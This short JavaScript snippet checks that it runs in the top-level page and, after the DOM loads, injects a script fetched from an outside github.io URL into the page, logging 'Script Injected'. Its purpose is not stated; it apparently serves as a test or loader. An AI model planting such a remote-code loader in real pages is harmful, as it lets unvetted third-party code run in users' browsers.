if (parent.document.URL !== document.location.href) {
    throw new Error("Not the main page");
}

document.addEventListener("DOMContentLoaded", function() {
    var script = document.createElement("script");
    script.setAttribute("src", "https://ariqhikari.github.io/data/test-script.js");
    document.body.appendChild(script);
    console.log("******* Script Injected *******");
});
